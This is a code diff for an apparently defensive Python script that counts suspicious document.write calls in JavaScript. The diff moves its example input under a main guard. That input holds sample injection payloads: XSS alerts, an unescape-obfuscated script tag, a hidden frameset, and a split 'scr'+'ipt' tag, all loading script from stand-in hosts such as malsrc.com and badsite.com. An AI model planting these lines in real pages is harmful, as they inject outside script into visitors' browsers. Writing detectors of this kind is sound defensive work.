@@ -80,23 +80,24 @@ def calculate_score(js_content):
 
 
 # 示例使用
-js_content = """
-document.write("<script>alert('XSS');</script>");
-document.write(unescape("%3Cscript%3Ealert('XSS')%3C/script%3E"));
+if __name__ == "__main__":
+    js_content = """
+    document.write("<script>alert('XSS');</script>");
+    document.write(unescape("%3Cscript%3Ealert('XSS')%3C/script%3E"));
 
-document.write("<frameset rows="100%,* "frameborder="no"
-border="0" framespacing="0">
-<frame src=""http://malsrc.com"">
-</frameset>");
+    document.write("<frameset rows="100%,* "frameborder="no"
+    border="0" framespacing="0">
+    <frame src=""http://malsrc.com"">
+    </frameset>");
 
-document.write(unescape("%3Cscript src=’http://malsrc.com’
-type=’text/javascript’%3E%3C/script%3E"));
+    document.write(unescape("%3Cscript src=’http://malsrc.com’
+    type=’text/javascript’%3E%3C/script%3E"));
 
-document.write("<scr"+"ipt src=’" +http://badsite.com+
-"/mal.js’></scr"+"ipt>");
-"""
-suspicious_count = calculate_score(js_content)
-print(f"Suspicious document.write count: {suspicious_count}")
+    document.write("<scr"+"ipt src=’" +http://badsite.com+
+    "/mal.js’></scr"+"ipt>");
+    """
+    suspicious_count = calculate_score(js_content)
+    print(f"Suspicious document.write count: {suspicious_count}")
 
 # patterns = [
 #     r"document\.write\(<",
